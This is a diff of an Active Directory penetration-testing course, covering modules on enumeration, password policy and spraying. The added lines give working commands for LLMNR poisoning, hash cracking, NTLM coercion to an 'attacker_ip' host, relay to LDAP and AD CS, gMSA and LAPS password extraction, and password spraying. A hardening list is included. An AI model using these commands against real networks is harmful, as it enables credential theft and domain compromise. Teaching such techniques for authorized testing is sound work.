-adminCount: 1
+Wait for name resolution failures on the network. When a user mistypes a share name or DNS fails, Responder answers and captures the NTLMv2 hash.
 
-dn: CN=jdoe,CN=Users,DC=corp,DC=local
-sAMAccountName: jdoe
-userAccountControl: 512
-adminCount: 0
+**Inveigh (Windows — when you're already on a domain-joined machine):**
 
-dn: CN=svc_sql,CN=Users,DC=corp,DC=local
-sAMAccountName: svc_sql
-userAccountControl: 66048
-adminCount: 0
-
-dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
-sAMAccountName: svc_legacy
-userAccountControl: 4260352
-adminCount: 0
+```powershell
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 ```
 
-- `Administrator`: Normal (512) + Protected (adminCount=1).  
-- `jdoe`: Normal user.  
-- `svc_sql`: Service account (66048 = Normal + PwdNeverExpires).  
-- `svc_legacy`: Service account + DONT_REQUIRE_PREAUTH.
+**Extract hashes:**
 
-#### 2. Privileged Users (`adminCount=1`)
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(adminCount=1))" sAMAccountName,memberOf
+```
+grep "NTLMv2-SSP" /usr/share/responder/logs/*.txt > captured.hash
 ```
 
-**Expected Output**:  
+**Crack with hashcat:**
+
 ```
-dn: CN=Administrator,CN=Users,DC=corp,DC=local
+hashcat -m 5600 captured.hash wordlist.txt
+```
+
+### 2. NTLM Coercion Techniques (Force Authentication)
+
+Instead of waiting for poisoning opportunities, actively force machines to authenticate to you. These are critical for relay chains.
+
+**PetitPotam (CVE-2021-36942) — Coerce via EFS RPC:**
+
+```
+# Unauthenticated (if unpatched)
+python3 PetitPotam.py attacker_ip target_dc_ip
+
+# Authenticated
+python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
+```
+
+**PrinterBug / SpoolSample — Coerce via Print Spooler:**
+
+```
+# Python
+python3 printerbug.py corp.local/user1:'Pass123'@target_dc_ip attacker_ip
+
+# Windows
+SpoolSample.exe target_dc attacker_host
+```
+
+Requires Print Spooler service running on target (common on DCs).
+
+**DFSCoerce — Coerce via DFS RPC:**
+
+```
+python3 dfscoerce.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
+```
+
+**ShadowCoerce — Coerce via File Server VSS Agent:**
+
+```
+python3 shadowcoerce.py -u user1 -p 'Pass123' -d corp.local attacker_ip target_dc_ip
+```
+
+**Coercer (all-in-one — tries all coercion methods automatically):**
+
+```
+python3 Coercer.py coerce -u user1 -p 'Pass123' -d corp.local \
+  --target-ip target_dc_ip --listener-ip attacker_ip
+```
+
+**WebDAV Coercion (HTTP-based — bypasses SMB signing):**
+
+When the WebClient service runs on a target, coercion triggers HTTP auth instead of SMB. This is critical because HTTP auth can be relayed to LDAP even when SMB signing is enforced.
+
+```
+# Check for WebClient service
+nxc smb 10.0.0.0/24 -u user1 -p 'Pass123' -M webdav
+
+# Coerce via PetitPotam over HTTP
+python3 PetitPotam.py -u user1 -p 'Pass123' -d corp.local attacker@80/test target_ip
+```
+
+**MSSQL Coercion (via xp_dirtree — forces SQL service account to authenticate):**
+
+```
+# On compromised MSSQL
+EXEC master..xp_dirtree '\\attacker_ip\share\test';
+
+# Capture with Responder or relay
+```
+
+### 3. NTLM Relay Attacks
+
+**Relay to SMB (requires SMB signing disabled on target):**
+
+```
+# First, identify hosts with SMB signing disabled
+nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
+
+# Relay
+impacket-ntlmrelayx -tf relay_targets.txt --smb2support -i
+```
+
+**Relay to LDAP (requires LDAP signing not enforced — common):**
+
+```
+# Relay to LDAP for DCSync rights
+impacket-ntlmrelayx -t ldap://dc1.corp.local --escalate-user attacker_user
+
+# Relay to LDAP for Shadow Credentials
+impacket-ntlmrelayx -t ldap://dc1.corp.local --shadow-credentials --shadow-target dc1$
+```
+
+**Relay to AD CS Web Enrollment (ESC8 — see Module 8):**
+
+```
+impacket-ntlmrelayx -t http://ca-server.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+**Full attack chain example (PetitPotam + ESC8):**
+
+```
+# Terminal 1: Start relay to AD CS
+impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp --adcs --template DomainController
+
+# Terminal 2: Coerce DC to authenticate to us
+python3 PetitPotam.py attacker_ip dc1.corp.local
+
+# Result: Certificate issued for DC01$ → use with Certipy to get DC hash
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
+```
+
+### 4. Post-Capture: Credential Validation
+
+```
+# Validate cracked creds via SMB
+nxc smb dc1.corp.local -u jdoe -p 'Password123'
+
+# Validate via WinRM
+nxc winrm dc1.corp.local -u jdoe -p 'Password123'
+
+# Validate via LDAP
+nxc ldap dc1.corp.local -u jdoe -p 'Password123'
+```
+
+### Hardening
+
+- **Disable LLMNR** via GPO: Computer Configuration → Administrative Templates → Network → DNS Client → **Turn off multicast name resolution** → Enabled.
+- **Disable NBT-NS** via network adapter settings or DHCP option 001.
+- **Enforce SMB Signing** on all machines (not just servers).
+- **Enforce LDAP Signing and Channel Binding** on Domain Controllers.
+- **Disable Print Spooler** on Domain Controllers.
+- **Apply patches** for PetitPotam and other coercion vulnerabilities.
+- **Enable Extended Protection for Authentication (EPA)** on AD CS IIS endpoints.
+
+## Module 4: Enumerating Users, Groups & Privileged Accounts
+
+*Find privileged users, service accounts, AS-REP roastable accounts, groups, and ACL-based shadow admins — all in one place.*
+
+### Key Definitions
+
+**sAMAccountName** — Pre-Windows 2000 username (e.g., `jdoe`).
+
+**userAccountControl (UAC)** — Bitmask controlling account properties. Key flags:
+
+| Flag | Value | Meaning |
+|------|-------|---------|
+| ACCOUNTDISABLE | 2 | Account is disabled |
+| NORMAL_ACCOUNT | 512 | Standard enabled user |
+| DONT_EXPIRE_PASSWORD | 65536 | Password never expires |
+| DONT_REQUIRE_PREAUTH | 4194304 | AS-REP Roastable |
+
+Example: `userAccountControl: 66048` = 512 (Normal) + 65536 (PwdNeverExpires).
+
+**adminCount** — Set to `1` on accounts that are (or were) in protected groups like Domain Admins. Useful for quickly identifying high-value targets. Note: `adminCount` is sticky — it remains `1` even after removal from the group.
+
+**Service Principal Name (SPN)** — Identifier for a service instance (e.g., `MSSQLSvc/sqlsrv.corp.local:1433`). Accounts with SPNs can be Kerberoasted.
+
+**groupType** — Bitmask for group scope:
+
+| Value | Meaning |
+|-------|---------|
+| -2147483646 | Global Security Group |
+| -2147483644 | Universal Security Group |
+| -2147483643 | Universal Distribution Group |
+
+### 1. User Enumeration
+
+**All users (LDAP):**
+
+```
+ldapsearch -x -H ldap://DC01.corp.local -D "CORP\user1" -w 'Pass123' \
+  -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(objectClass=user))" \
+  sAMAccountName userAccountControl adminCount description
+```
+
+**All users (PowerShell):**
+
+```powershell
+Get-ADUser -Filter * -Properties adminCount, Description, Enabled |
+  Select Name, SamAccountName, adminCount, Enabled, Description
+```
+
+### 2. Privileged Users (adminCount=1)
+
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(objectClass=user)(adminCount=1))" \
+  sAMAccountName memberOf
+```
+
+Example output:
+
+```
 sAMAccountName: Administrator
 memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
 
-dn: CN=jsmith,CN=Users,DC=corp,DC=local
-sAMAccountName: jsmith
-memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
-
-dn: CN=svc_backup,CN=Users,DC=corp,DC=local
 sAMAccountName: svc_backup
-memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
+memberOf: CN=Backup Operators,CN=Builtin,DC=corp,DC=local
 ```
 
-#### 3. AS-REP Roastable Accounts
+### 3. AS-REP Roastable Accounts (DONT_REQUIRE_PREAUTH)
 
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName,userAccountControl
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
+  sAMAccountName userAccountControl
 ```
 
-**Expected Output**:  
-```
-dn: CN=svc_legacy,CN=Users,DC=corp,DC=local
-sAMAccountName: svc_legacy
-userAccountControl: 4260352
+### 4. Service Accounts with SPNs (Kerberoastable)
 
-dn: CN=svc_oldjr,CN=Users,DC=corp,DC=local
-sAMAccountName: svc_oldjr
-userAccountControl: 4194304
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
+  sAMAccountName servicePrincipalName
 ```
 
-#### 4. Service Accounts with SPNs
+Example output:
 
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" sAMAccountName,servicePrincipalName
 ```
-
-**Expected Output**:  
-```
-dn: CN=svc_sql,CN=Users,DC=corp,DC=local
 sAMAccountName: svc_sql
 servicePrincipalName: MSSQLSvc/sqlsrv.corp.local:1433
 
-dn: CN=svc_ftp,CN=Users,DC=corp,DC=local
 sAMAccountName: svc_ftp
 servicePrincipalName: ftp/corp.local
 ```
 
-#### 5. Disabled Users
+### 5. Disabled Users (check for stale privileged accounts)
 
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" sAMAccountName,userAccountControl,memberOf,whenChanged
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
+  sAMAccountName memberOf whenChanged
 ```
 
-**Expected Output**:  
-```
-dn: CN=test_user,CN=Users,DC=corp,DC=local
-sAMAccountName: test_user
-userAccountControl: 514
-memberOf: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
-whenChanged: 20250210123045.0Z
+### 6. Group Enumeration
 
-dn: CN=svc_oldsvc,CN=Users,DC=corp,DC=local
-sAMAccountName: svc_oldsvc
-userAccountControl: 66050
-memberOf: CN=Backup Operators,CN=Users,DC=corp,DC=local
-whenChanged: 20240104101530.0Z
+**All groups:**
+
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(objectCategory=group)" cn distinguishedName groupType
 ```
 
-#### 6. Enumerate All Groups
+**Built-in groups (high-privilege):**
 
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" \
+  "(objectCategory=group)" cn
 ```
 
-**Expected Output**:  
+Key built-in groups to check: Administrators, Domain Admins, Enterprise Admins, Backup Operators, Account Operators, Server Operators, Print Operators, DnsAdmins, Group Policy Creator Owners.
+
+**Members of Domain Admins:**
+
 ```
-dn: CN=Domain Users,CN=Users,DC=corp,DC=local
-cn: Domain Users
-groupType: -2147483646
-
-dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
-cn: Domain Admins
-groupType: -2147483646
-
-dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
-cn: Backup Operators
-groupType: -2147483646
-
-dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
-cn: IT-Helpdesk
-groupType: -2147483648
-
-dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
-cn: CORP_Admins
-groupType: -2147483644
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=group)(cn=Domain Admins))" member
 ```
 
-#### 7. Decode groupType Values  
-- `-2147483646` (0x80000002) = Global Security Group  
-- `-2147483648` (0x80000000) = Global Security Group  
-- `-2147483644` (0x80000004) = Universal Security Group  
+**Recursive group membership (find nested DA paths):**
 
-#### 8. Enumerate Members of “Domain Admins”
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
+```
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn
 ```
 
-**Expected Output**:  
-```
-dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
-member: CN=Administrator,CN=Users,DC=corp,DC=local
-member: CN=jsmith,CN=Users,DC=corp,DC=local
-member: CN=svc_backup,CN=Users,DC=corp,DC=local
+PowerShell equivalent:
+
+```powershell
+Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select Name, SamAccountName, objectClass
 ```
 
-#### 9. Recursive Group Membership
+### 7. ACL-Based Shadow Admins
 
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName
+Accounts with `GenericAll`, `WriteDacl`, or `WriteOwner` on critical objects can escalate to DA without being in DA.
+
+**PowerView (PowerShell):**
+
+```powershell
+Import-Module .\PowerView.ps1
+
+# Check ACLs on Domain Admins group
+Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" } |
+  Select IdentityReference, ActiveDirectoryRights
+
+# Check ACLs on Users OU
+Get-ObjectAcl -DistinguishedName "CN=Users,DC=corp,DC=local" -ResolveGUIDs |
+  Where-Object { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl" } |
+  Select IdentityReference, ActiveDirectoryRights
 ```
 
-**Expected Output**:  
+Example output showing a shadow admin:
+
 ```
-dn: CN=Admins,OU=Groups,DC=corp,DC=local
-cn: Admins
-
-dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
-cn: Domain Admins
+IdentityReference          ActiveDirectoryRights
+-----------------          ---------------------
+CORP\AuditGroup            WriteDacl
+CORP\Domain Admins         GenericAll
 ```
 
-### Common Pitfalls  
-- Misreading `userAccountControl` flags  
-- Forgetting `objectCategory=person` when filtering users  
-- Ignoring FGPP overrides  
-- Overlooking nested group membership  
+`CORP\AuditGroup` has WriteDacl on Users OU — any member of AuditGroup can modify permissions on user objects and escalate.
 
-### Next Steps  
-- **Module 3**: Reviewing Domain Password Policies & Attack Opportunities  
-- **Module 4**: Identifying Built-In Groups & Default Security Settings  
+**BloodHound is the best tool for this** — run "Find Shortest Paths to Domain Admins" to visualize all shadow admin paths.
 
----
+### 8. GMSA (Group Managed Service Accounts) Enumeration
 
-## <a name="module-5"></a> Module 5: Reviewing Domain Password Policies & Attack Opportunities
+GMSAs have auto-rotating passwords. If you can read the `msDS-GroupMSAMembership` attribute, you can extract the password.
 
-### Introduction  
-Learn to evaluate default domain policy and FGPP (PSOs) to decide whether to use password spraying, brute-forcing, Kerberoasting, or AS-REP roasting.
+```powershell
+# Find all gMSAs
+Get-ADServiceAccount -Filter * -Properties msDS-GroupMSAMembership, msDS-ManagedPasswordInterval, PrincipalsAllowedToRetrieveManagedPassword
 
-### Definitions  
-1. **Password Policy**: Rules for password complexity, length, expiration.  
-2. **Group Policy Object (GPO)**: Collection of policies applied to users/computers.  
-3. **Fine-Grained Password Policy (FGPP / PSO)**: Password settings applied to specific users or groups.  
-4. **Lockout Threshold**: Number of failed attempts before lockout.  
-5. **Password History Count**: Number of previous passwords remembered.  
+# From Linux
+ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" \
+  "(objectClass=msDS-GroupManagedServiceAccount)" \
+  sAMAccountName msDS-GroupMSAMembership msDS-ManagedPasswordInterval
+```
 
-### Why It Matters  
-- Weak policies = password spraying or brute-forcing can succeed.  
-- Strong policies = pivot to Kerberoast or AS-REP roast.
+**Extract GMSA password (if you're in the allowed principals):**
 
-### Tools & Commands  
+```
+# Python - gMSADumper
+python3 gMSADumper.py -u user1 -p 'Pass123' -d corp.local
 
-#### Command Prompt  
-- Default policy:  
-  ```bat
-  net accounts /domain
-  ```
+# NetExec
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --gmsa
+```
 
-#### PowerShell  
-- Default policy:  
-  ```powershell
-  Get-ADDefaultDomainPasswordPolicy | Format-List *
-  ```  
-- FGPP:  
-  ```powershell
-  Get-ADFineGrainedPasswordPolicy | Format-List Name,msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence
-  ```
+### 9. LAPS (Local Administrator Password Solution) Enumeration
 
-#### LDAP Queries  
-- Find PSOs:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
-  ```
+LAPS stores local admin passwords in AD attributes. If you can read them, you get local admin on that machine.
 
-### Step-by-Step Guide  
+```powershell
+# Legacy LAPS (ms-Mcs-AdmPwd)
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
+  Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } |
+  Select Name, 'ms-Mcs-AdmPwd'
 
-#### 1. Check Default Domain Policy  
+# Windows LAPS (msLAPS-Password — Server 2022+)
+Get-ADComputer -Filter * -Properties msLAPS-Password |
+  Where-Object { $_.'msLAPS-Password' -ne $null }
+```
 
-```bat
+**From Linux:**
+
+```
+# NetExec
+nxc ldap dc1.corp.local -u user1 -p 'Pass123' --laps
+
+# ldapsearch
+ldapsearch -x -H ldap://DC01.corp.local -D "CORP\user1" -w 'Pass123' \
+  -b "DC=corp,DC=local" "(objectCategory=computer)" ms-Mcs-AdmPwd
+```
+
+## Module 5: Password Policy & Password Spraying
+
+*Evaluate password policies and spray intelligently.*
+
+### 1. Check Default Domain Password Policy
+
+```
 net accounts /domain
 ```
 
-**Expected Output**:  
+Example output:
+
 ```
 Minimum password length: 7
 Lockout threshold: 5
 Lockout duration: 30 minutes
 Maximum password age: 90 days
-Minimum password age: 1 day
 ```
-
-#### 2. PowerShell Default Policy  
 
 ```powershell
-Get-ADDefaultDomainPasswordPolicy | Format-List *
+Get-ADDefaultDomainPasswordPolicy | Format-List MinPasswordLength, LockoutThreshold, ComplexityEnabled, PasswordHistoryCount
 ```
 
-**Expected Output**:  
-```
-ComplexityEnabled: True
-MinPasswordLength : 7
-LockoutThreshold : 5
-PasswordHistoryCount: 24
-...
+### 2. Check Fine-Grained Password Policies (FGPPs)
+
+FGPPs (Password Settings Objects) override the default policy for specific groups. `net accounts` does NOT show these.
+
+```powershell
+Get-ADFineGrainedPasswordPolicy -Filter * |
+  Format-List Name, Precedence, MinPasswordLength, LockoutThreshold, 'msDS-PSOAppliesTo'
 ```
 
-#### 3. Enumerate FGPP (PSOs)  
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" msDS-MinimumPasswordLength,msDS-LockoutThreshold,msDS-PasswordHistoryLength,msDS-PasswordSettingsPrecedence,msDS-PSOAppliesTo
+```
+ldapsearch -x -H ldap://DC01.corp.local \
+  -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" \
+  "(objectClass=msDS-PasswordSettings)" \
+  cn msDS-MinimumPasswordLength msDS-LockoutThreshold msDS-PSOAppliesTo
 ```
 
-**Expected Output**:  
+Example — DAs have strict PSO (14 chars, lockout at 3), service accounts have relaxed PSO (12 chars, no lockout):
+
 ```
-dn: CN=StrictAdminsPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
+cn: StrictAdminsPSO
 msDS-MinimumPasswordLength: 14
 msDS-LockoutThreshold: 3
-msDS-PasswordHistoryLength: 50
-msDS-PasswordSettingsPrecedence: 1
 msDS-PSOAppliesTo: CN=Domain Admins,CN=Users,DC=corp,DC=local
 
-dn: CN=LegacySvcPSO,CN=Password Settings Container,CN=System,DC=corp,DC=local
+cn: LegacySvcPSO
 msDS-MinimumPasswordLength: 12
 msDS-LockoutThreshold: 0
-msDS-PasswordHistoryLength: 0
-msDS-PasswordSettingsPrecedence: 2
 msDS-PSOAppliesTo: CN=ServiceAccounts,OU=Groups,DC=corp,DC=local
 ```
 
-### Attack Decision Logic  
-- **MinLength ≤ 7 & Complexity = False**: Password spraying.  
-- **Strong Policy** (MinLength ≥ 14): Skip brute-forcing users; target Kerberoast/AS-REP.  
-- **PSO for DAs**: If StrictAdminsPSO applies to DAs, do not spray DAs; focus on service accounts.
+### 3. Attack Decision Logic
 
-### Common Pitfalls  
-- `net accounts /domain` hides PSOs.  
-- Overlooking `Password Never Expires`.  
-- Ignoring `LockoutThreshold` when spraying.
+| Condition | Action |
+|-----------|--------|
+| MinLength ≤ 7, Complexity off | Password spray aggressively |
+| MinLength ≤ 7, Lockout ≥ 5 | Spray with 3 attempts per interval |
+| MinLength ≥ 14, Strong policy | Skip spraying users — target Kerberoast/AS-REP instead |
+| Service PSO with LockoutThreshold = 0 | Spray service accounts without lockout risk |
 
-### Next Steps  
-- **Module 4**: Identifying Built-In Groups & Default Security Settings  
+### 4. Build Target Lists
 
----
+```
+# All users from IT OU
+ldapsearch -x -H ldap://dc1.corp.local \
+  -b "OU=IT,DC=corp,DC=local" \
+  "(objectCategory=person)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > targets.txt
 
-## <a name="module-6"></a> Module 6: Identifying Built-In Groups & Default Security Settings
-
-### Introduction  
-Enumerate all groups, decode their `groupType`, identify built-in and custom high-priv groups, and examine ACLs for shadow admin paths.
-
-### Definitions  
-1. **groupType**: Bitmask for group scope (Global, Universal, Domain Local) and security.  
-2. **Security Group vs. Distribution Group**: Security groups assign permissions; distribution do not.  
-3. **Built-In Groups**: Default AD groups under `CN=Builtin,DC=corp,DC=local`.  
-4. **ACL (Access Control List)**: List of ACEs granting/denying rights to principals.  
-5. **ACE (Access Control Entry)**: Single entry specifying principal, rights (e.g., `GenericAll`, `WriteDACL`), and inheritance.  
-6. **GenericAll**: Full control over an object.  
-7. **GenericWrite**: Write properties on object.  
-8. **WriteDACL**: Modify the ACL itself.  
-9. **Shadow Admins**: Accounts/groups not in DA but with rights leading to DA.
-
-### Why It Matters  
-- High-priv groups (DA, EA) obvious. Custom or built-in groups (Backup Operators, Account Operators) also powerful.  
-- ACL misconfigs let low-priv users escalate without credentials.
-
-### Tools & Commands  
-
-#### LDAP Queries  
-- All groups:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
-  ```  
-- Built-In groups:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
-  ```  
-- Members of “Domain Admins”:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
-  ```  
-- Recursive membership:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=<DN>))" cn,member
-  ```
-
-#### PowerShell  
-- List groups with scope:  
-  ```powershell
-  Get-ADGroup -Filter * | Select Name,GroupScope,GroupCategory
-  ```  
-- Built-In groups:  
-  ```powershell
-  Get-ADGroup -SearchBase "CN=Builtin,DC=corp,DC=local" -Filter * | Select Name
-  ```  
-- Recursive members:  
-  ```powershell
-  Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select Name,sAMAccountName,objectClass
-  ```  
-- ACL on OU:  
-  ```powershell
-  $acl = Get-Acl "AD:OU=Admins,DC=corp,DC=local"
-  $acl.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" }
-  ```
-
-#### BloodHound  
-- Collect data:  
-  ```powershell
-  Invoke-SharpHound -CollectionMethod ACL,Group,Session,LocalAdmin
-  ```  
-- Visualize: Load JSON into BloodHound GUI and run “Find Shortest Paths to Domain Admins”.
-
-### Step-by-Step Guide  
-
-#### 1. Enumerate All Groups & Decode `groupType`
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName,groupType
+# Users from Kerbrute (username enumeration without creds)
+kerbrute userenum -d corp.local --dc dc1.corp.local usernames.txt -o valid_users.txt
 ```
 
-**Expected Output (partial)**:  
+### 5. Password Spraying
+
+**NetExec (formerly CrackMapExec — CME is archived, use `nxc`):**
+
 ```
-dn: CN=Domain Users,CN=Users,DC=corp,DC=local
-cn: Domain Users
-groupType: -2147483646
+# Spray via LDAP (less noise than SMB)
+nxc ldap dc1.corp.local -u targets.txt -p 'Spring2025!' --continue-on-success
 
-dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
-cn: Domain Admins
-groupType: -2147483646
+# Spray via SMB
+nxc smb dc1.corp.local -u targets.txt -p 'Spring2025!' --continue-on-success
 
-dn: CN=Backup Operators,CN=Users,DC=corp,DC=local
-cn: Backup Operators
-groupType: -2147483646
-
-dn: CN=IT-Helpdesk,CN=Users,DC=corp,DC=local
-cn: IT-Helpdesk
-groupType: -2147483648
-
-dn: CN=CORP_Admins,OU=Groups,DC=corp,DC=local
-cn: CORP_Admins
-groupType: -2147483644
+# Spray via Kerberos (stealthiest — no NTLM events)
+nxc smb dc1.corp.local -u targets.txt -p 'Spring2025!' -k --continue-on-success
 ```
 
-- `-2147483646` (0x80000002): Global Security Group  
-- `-2147483648` (0x80000000): Global Security Group  
-- `-2147483644` (0x80000004): Universal Security Group  
+**Kerbrute (Kerberos-based, no NTLM logs):**
 
-#### 2. Enumerate Built-In Groups
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(objectCategory=group)" cn,distinguishedName
+```
+kerbrute passwordspray -d corp.local --dc dc1.corp.local targets.txt 'Spring2025!'
 ```
 
-**Expected Output**:  
-```
-dn: CN=Administrators,CN=Builtin,DC=corp,DC=local
-cn: Administrators
-
-dn: CN=Users,CN=Builtin,DC=corp,DC=local
-cn: Users
-
-dn: CN=Guests,CN=Builtin,DC=corp,DC=local
-cn: Guests
-
-dn: CN=Account Operators,CN=Builtin,DC=corp,DC=local
-cn: Account Operators
-
-dn: CN=Backup Operators,CN=Builtin,DC=corp,DC=local
-cn: Backup Operators
-
-dn: CN=Server Operators,CN=Builtin,DC=corp,DC=local
-cn: Server Operators
-
-dn: CN=Print Operators,CN=Builtin,DC=corp,DC=local
-cn: Print Operators
-```
-
-#### 3. Enumerate Members of High-Privilege Groups
-
-- Domain Admins:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Domain Admins))" member
-  ```
-
-- Enterprise Admins:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(cn=Enterprise Admins))" member
-  ```
-
-- Account Operators:  
-  ```bash
-  ldapsearch -x -H ldap://DC01.corp.local -b "CN=Builtin,DC=corp,DC=local" "(&(objectCategory=group)(cn=Account Operators))" member
-  ```
-
-#### 4. Recursive Group Membership
-
-```bash
-ldapsearch -x -H ldap://DC01.corp.local -b "DC=corp,DC=local" "(&(objectCategory=group)(member:1.2.840.113556.1.4.1941:=CN=helpdesk,CN=Users,DC=corp,DC=local))" cn,distinguishedName,member
-```
-
-**Expected Output**:  
-```
-dn: CN=Admins,OU=Groups,DC=corp,DC=local
-cn: Admins
-member: CN=helpdesk,CN=Users,DC=corp,DC=local
-
-dn: CN=Domain Admins,CN=Users,DC=corp,DC=local
-cn: Domain Admins
-member: CN=Admins,OU=Groups,DC=corp,DC=local
-member: CN=jsmith,CN=Users,DC=corp,DC=local
-```
-
-#### 5. Check ACLs on Users OU
+**DomainPasswordSpray (PowerShell, from domain-joined machine):**
 
 ```powershell
-$aclUsers = Get-Acl "AD:CN=Users,DC=corp,DC=local"
-$aclUsers.Access | Where-Object { $_.ActiveDirectoryRights -match "GenericAll" -or $_.ActiveDirectoryRights -match "WriteDacl" } | Select-Object IdentityReference,ActiveDirectoryRights,ObjectType,InheritanceType
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password 'Spring2025!' -OutFile sprayed.txt
 ```
 
-**Expected Output**:  
-```
-IdentityReference          ActiveDirectoryRights   ObjectType                               InheritanceType
--------          -                                  -----
-CORP\AuditGroup            WriteDacl               bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
-CORP\Domain Admins         GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
-BUILTIN\Administrators     GenericAll              bf967aba-0de6-11d0-a285-00aa003049e2    Descendents,This Object
-```
-
-- “AuditGroup” has WriteDacl on Users OU → shadow admin.
-
-### Common Pitfalls  
-- Misinterpreting `groupType` bits  
-- Overlooking ACL inheritance  
-- Ignoring built-in groups in `CN=Builtin`
-
-### Next Steps  
-- **Module 5**: Enumerating Computers, SPN Delegation & Trust Relationships  
-
----
-
-## <a name="module-7"></a> Module 7: Credentialed Enumeration (Linux & Windows)
-
-_Use valid credentials to uncover detailed Active Directory information._
-
-### Key Concepts
-
--   **Authenticated Bind**  
